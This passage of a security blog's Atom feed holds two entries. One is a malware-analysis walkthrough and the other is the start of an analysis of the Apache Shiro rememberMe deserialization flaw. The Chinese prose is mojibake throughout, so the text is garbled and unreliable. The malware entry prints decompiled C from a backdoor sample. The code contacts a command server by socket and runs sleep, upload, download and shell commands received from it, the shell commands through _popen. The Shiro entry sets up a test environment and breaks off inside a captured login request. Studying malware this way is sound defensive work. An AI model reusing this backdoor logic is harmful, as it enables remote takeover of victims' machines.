</p><p>æ‰“å¼€æ³¨å†Œè¡¨æŒ‰ç…§å‚æ•°å‘ç°é›€æ°æ·»åŠ äº†æ‰€ä¼ å…¥çš„å‚æ•°</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825211222687.png" alt="image-20220825211222687">  </p><p>æ¥ç€è·³å‡ºmainå‡½æ•°ï¼Œç»“æŸ</p><p>è‡³æ­¤-c å‚æ•°åˆ†æå®Œæ¯•ï¼Œå³å‘æŒ‡å®šæ³¨å†Œè¡¨æ·»åŠ value</p><p>æ¥ç€åˆ†æ-cc abcd</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825212325566.png" alt="image-20220825212325566"> </p><p>æœ‰ä¸¤ä¸ªè·³è½¬ï¼Œodè·Ÿè¿›å‘ç°å¹¶æ²¡æœ‰è·³è½¬ï¼Œå…ˆè¿‡ã€‚æ¥ç€call 401280</p><p>åæ±‡ç¼–æŸ¥çœ‹ä»£ç </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825212923365.png" alt="image-20220825212923365"> </p><p>å¤§æ¦‚å°±æ˜¯æ³¨å†Œè¡¨æŸ¥value</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825213434020.png" alt="image-20220825213434020"> </p><p>æ‰“å¼€æ³¨å†Œè¡¨ï¼Œç„¶åæŸ¥å€¼</p><p>è·³å‡º401280åcall 402e74ï¼ˆæ„Ÿè§‰æƒ³printfå‡½æ•°ï¼‰</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825213657475.png" alt="image-20220825213657475"> </p><p>  å‘ç°å°†æŸ¥è¯¢åˆ°çš„valueæ‰“å°å‡ºæ¥ï¼Œç„¶ååˆ é™¤è‡ªèº«ï¼Œç»“æŸ</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825213749050.png" alt="image-20220825213749050"> </p><p>æ¥ä¸‹æ¥åˆ†ææ— å‚ï¼Œè®¾ç½®å‚æ•°ä¸ºabcd</p><p>è·³è½¬è‡³æ­¤401000ï¼Œ</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825215514339.png" alt="image-20220825215514339"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825220021109.png" alt="image-20220825220021109"> </p><p>æ¥ç€call 402360</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825220103045.png" alt="image-20220825220103045"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825220208694.png" alt="image-20220825220208694"> </p><p>å‘ç°æ˜¯ä¸€ä¸ªæ­»å¾ªç¯ï¼Œä¸”é€šè¿‡401280å’Œ402020è·³å‡ºå¾ªç¯</p><p>æŸ¥çœ‹401280</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825220353919.png" alt="image-20220825220353919"> </p><p>çŒœæµ‹å¦‚æœæŸ¥è¯¢æ³¨å†Œè¡¨ä¸­çš„valueï¼Œåˆ™è·³å‡ºå¾ªç¯</p><p>æŸ¥çœ‹402020</p><p>ä»£ç è¾ƒé•¿ä¸æ”¾äº†</p><p>å…ˆcalläº†401e60</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> <span class="type">int</span> __cdecl <span class="title function_">sub_401E60</span><span class="params">(<span class="type">char</span> *a1, <span class="type">signed</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  u_short hostshort[<span class="number">2</span>]; <span class="comment">// [sp+8h] [bp-1424h]@3</span></span><br><span class="line">  <span class="type">char</span> name; <span class="comment">// [sp+Ch] [bp-1420h]@1</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [sp+40Ch] [bp-1020h]@11</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+410h] [bp-101Ch]@1</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// [sp+414h] [bp-1018h]@13</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+418h] [bp-1014h]@5</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// [sp+428h] [bp-1004h]@9</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [sp+42Ch] [bp-1000h]@7</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">4096</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_401420(&amp;name, <span class="number">1024</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( sub_401470(hostshort) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( sub_401D80(&amp;v8) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( sub_401AF0(&amp;name, hostshort[<span class="number">0</span>], (<span class="type">int</span>)&amp;v8, &amp;v10, (<span class="type">int</span>)&amp;v6) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="built_in">strstr</span>(&amp;v10, asc_40C090);</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = v9;</span><br><span class="line">      v9 = <span class="built_in">strstr</span>(v9, asc_40C088);</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = v9;</span><br><span class="line">        <span class="keyword">if</span> ( v9 - v5 + <span class="number">1</span> &lt;= a2 )</span><br><span class="line">        &#123;</span><br><span class="line">          qmemcpy(a1, &amp;v5[<span class="built_in">strlen</span>(asc_40C090)], v7 - v5 - <span class="built_in">strlen</span>(asc_40C090));</span><br><span class="line">          a1[v7 - v5 - <span class="built_in">strlen</span>(asc_40C090)] = <span class="number">0</span>;</span><br><span class="line">          result = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          result = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­401420ä¸­è°ƒç”¨äº†401280ï¼Œå³-ccå‚æ•°ï¼Œå°±æ˜¯æŸ¥è¯¢value</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825222101625.png" alt="image-20220825222101625"> </p><p>æ¥ç€calläº†401470ï¼Œè¿›å»çœ‹åˆ°calläº†401280å’Œ402f6a</p><p>æ¥ç€calläº†401d80</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825222744151.png" alt="image-20220825222744151"> </p><p>å…ˆè·å–äº†å½“å‰æ—¶é—´time</p><p>ç„¶å4030e0å‡½æ•°å°†40C180çš„å€¼èµ‹ä¸ºtime</p><p>æ¥ç€call 401D10ï¼Œè·Ÿè¿›å»çœ‹</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825223222184.png" alt="image-20220825223222184"> </p><p>è¿”å›ä¸€ä¸ªä¸æ˜¯æ•°å­—&amp;&amp;ä¸æ˜¯å°å†™å­—æ¯&amp;&amp;ä¸æ˜¯å¤§å†™å­—æ¯çš„v1ï¼ˆæ­¤å¤„è¿”å›çš„æ˜¯54ï¼‰</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825223421058.png" alt="image-20220825223421058"></p><p>ä¸æ»¡è¶³æ¡ä»¶æ¥ç€ä¸€ç›´å¾ªç¯ </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220826085643786.png" alt="image-20220826085643786"> </p><p>è·³å‡ºï¼Œæ¥ç€call 401AF0ï¼Œå‚æ•°å¦‚æ ˆä¸­æ‰€ç¤º</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220826091132206.png" alt="image-20220826091132206"> </p><p>ä»£ç å¦‚ä¸‹ï¼Œå’Œsocketç½‘ç»œé€šä¿¡æœ‰å…³</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401AF0</span><span class="params">(<span class="type">char</span> *name, u_short hostshort, <span class="type">int</span> a3, <span class="type">char</span> *a4, <span class="type">int</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [sp+10h] [bp-60Ch]@5</span></span><br><span class="line">  SOCKET s; <span class="comment">// [sp+210h] [bp-40Ch]@1</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+214h] [bp-408h]@1</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [sp+218h] [bp-404h]@3</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [sp+618h] [bp-4h]@5</span></span><br><span class="line"></span><br><span class="line">  s = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_401640((<span class="type">int</span>)&amp;s, name, hostshort) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;buf, aGet);</span><br><span class="line">  <span class="built_in">strcat</span>(&amp;buf, (<span class="type">const</span> <span class="type">char</span> *)a3);</span><br><span class="line">  <span class="built_in">strcat</span>(&amp;buf, aHttp1_0);</span><br><span class="line">  <span class="keyword">if</span> ( send(s, &amp;buf, <span class="built_in">strlen</span>(&amp;buf), <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    closesocket(s);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10 = recv(s, &amp;v6, <span class="number">512</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v10 &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v10 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_401740(&amp;s);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v10 + v8) &gt; *(_DWORD *)a5 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401740(&amp;s);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    qmemcpy(&amp;a4[v8], &amp;v6, v10);</span><br><span class="line">    v8 += v10;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a4, asc_40C068) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v10 &gt; <span class="number">0</span> );</span><br><span class="line">  <span class="keyword">if</span> ( sub_401740(&amp;s) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)a5 = v8;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çºµè§‚ä»¥ä¸Šï¼Œå¯ä»¥å¾—åˆ°401e60ä¸»è¦åŠŸèƒ½ä¸ºä»¥ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _cdecl <span class="title function_">sub_401E60</span><span class="params">(cahr *a1,<span class="type">signed</span> <span class="type">int</span> a2)</span>&#123;</span><br><span class="line">    <span class="type">signed</span> <span class="type">int</span> result;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(sub_401420(...))&#123;    <span class="comment">// è·å–æ³¨å†Œè¡¨é”®å¹¶æˆªå–</span></span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(sub_401470(...))&#123;    <span class="comment">// è·å–æ³¨å†Œè¡¨é”®</span></span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(sub_401D80(...))&#123;    <span class="comment">// æ— èŠçš„å»¶æ—¶</span></span><br><span class="line">        resutl = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(sub_401AF0(...))&#123;    <span class="comment">// ç½‘ç»œGetå’Œrecv</span></span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(a = <span class="built_in">strstr</span>(...))&#123;    <span class="comment">// å­—ç¬¦ä¸²åŒ¹é…</span></span><br><span class="line">            <span class="keyword">if</span>(b = <span class="built_in">strstr</span>(...))&#123;</span><br><span class="line">                <span class="keyword">if</span>(b - a + <span class="number">1</span> &lt;= a2)&#123;</span><br><span class="line">                    <span class="built_in">memcpy</span>(a1 , ...);    <span class="comment">// å¤åˆ¶</span></span><br><span class="line">                    a1[...] = <span class="number">0</span>;</span><br><span class="line">                    result = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    result = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                result = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            result = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœè·å–å­—ç¬¦ä¸²æˆåŠŸï¼Œåˆ™è¿›å…¥40204Cï¼Œå¯ä»¥çœ‹åˆ°ç±»ä¼¼äºä¸€ä¸ªåé—¨åŠŸèƒ½</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_402020</span><span class="params">(<span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// ST2C_4@4</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ST30_4@4</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// eax@6</span></span><br><span class="line">  u_short v5; <span class="comment">// ST24_2@6</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// ST28_4@6</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// eax@10</span></span><br><span class="line">  u_short v8; <span class="comment">// ST1C_2@10</span></span><br><span class="line">  <span class="type">char</span> *lpFileName; <span class="comment">// ST20_4@10</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// eax@14</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v11; <span class="comment">// ST18_4@14</span></span><br><span class="line">  u_short hostshort; <span class="comment">// [sp+4h] [bp-424h]@14</span></span><br><span class="line">  FILE *v13; <span class="comment">// [sp+8h] [bp-420h]@14</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [sp+28h] [bp-400h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( sub_401E60(&amp;v14, <span class="number">1024</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;v14, aSleep, <span class="built_in">strlen</span>(aSleep)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(&amp;v14, asc_40C0C0);</span><br><span class="line">    v2 = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    v3 = atoi(v2);</span><br><span class="line">    Sleep(<span class="number">1000</span> * v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;v14, aUpload, <span class="built_in">strlen</span>(aUpload)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(&amp;v14, asc_40C0C0);</span><br><span class="line">    v4 = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    v5 = atoi(v4);</span><br><span class="line">    v6 = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    <span class="keyword">if</span> ( sub_4019E0(name, v5, v6) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;v14, aDownload, <span class="built_in">strlen</span>(aDownload)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(&amp;v14, asc_40C0C0);</span><br><span class="line">    v7 = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    v8 = atoi(v7);</span><br><span class="line">    lpFileName = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    <span class="keyword">if</span> ( sub_401870(name, v8, lpFileName) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;v14, aCmd, <span class="built_in">strlen</span>(aCmd)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(&amp;v14, asc_40C0C0);</span><br><span class="line">    v10 = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    hostshort = atoi(v10);</span><br><span class="line">    v11 = strtok(<span class="number">0</span>, asc_40C0A4);</span><br><span class="line">    v13 = _popen(v11, aRb);</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( sub_401790(name, hostshort, v13) )</span><br><span class="line">    &#123;</span><br><span class="line">      _pclose(v13);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _pclose(v13);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncmp</span>(&amp;v14, aNothing, <span class="built_in">strlen</span>(aNothing));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220826092049031.png" alt="image-20220826092049031"> </p><p>å¯ä»¥å®ç°cmdï¼Œå’Œupload</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;çºµè§‚&quot;&gt;&lt;a href=&quot;#çºµè§‚&quot; class=&quot;headerlink&quot; title=&quot;çºµè§‚&quot;&gt;&lt;/a&gt;çºµè§‚&lt;/h2&gt;&lt;h2 id=&quot;è¯¦ç»†åˆ†æ&quot;&gt;&lt;a href=&quot;#è¯¦ç»†åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;è¯¦ç»†åˆ†æ&quot;&gt;&lt;/a&gt;è¯¦ç»†åˆ†æ&lt;/h</summary>
      
    
    
    
    <category term="æ¶æ„ä»£ç " scheme="http://example.com/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    
    <category term="æ¶æ„ä»£ç " scheme="http://example.com/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="äºŒè¿›åˆ¶" scheme="http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>Shiroååºåˆ—åŒ–æ¼æ´</title>
    <link href="http://example.com/2022/08/06/shiro/"/>
    <id>http://example.com/2022/08/06/shiro/</id>
    <published>2022-08-06T13:16:50.000Z</published>
    <updated>2022-09-01T00:54:12.897Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><h4 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><ol><li><p>æ‰€éœ€ç¯å¢ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jdk8u65 </span><br><span class="line">Tomcat8</span><br><span class="line">shiro 1.2.4</span><br></pre></td></tr></table></figure></li><li><p>shiroç¯å¢ƒç›´æ¥clone pç¥çš„<a href="https://github.com/phith0n/JavaThings">githubåœ°å€</a></p></li><li><p>å¯åŠ¨tomcatï¼Œå³å¯çœ‹åˆ°</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830135606014.png" alt="image-20220830135606014"></p></li></ol><h4 id="Shiro550åˆ†æ"><a href="#Shiro550åˆ†æ" class="headerlink" title="Shiro550åˆ†æ"></a>Shiro550åˆ†æ</h4><h6 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h6><ol><li><p>å‹¾é€‰ RememberMe å­—æ®µï¼Œç™»é™†æˆåŠŸçš„è¯ï¼Œè¿”å›åŒ… set-Cookie ä¼šæœ‰ rememberMe&#x3D;deleteMe å­—</p><p>æ®µï¼Œè¿˜ä¼šæœ‰ rememberMe å­—æ®µï¼Œä¹‹åçš„æ‰€æœ‰è¯·æ±‚ä¸­ Cookie éƒ½ä¼šæœ‰ rememberMe å­—æ®µï¼Œé‚£ä¹ˆå°±</p><p>å¯ä»¥åˆ©ç”¨è¿™ä¸ª rememberMe è¿›è¡Œååºåˆ—åŒ–ï¼Œä»è€Œ getshellã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">////Request</span><br><span class="line">POST /shirodemo_war/login.jsp HTTP/1.1</span><br><span class="line">Host: 192.168.124.15:8081</span><br><span class="line">Content-Length: 56</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.124.15:8081</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36</span><br><span class="line">Accept: 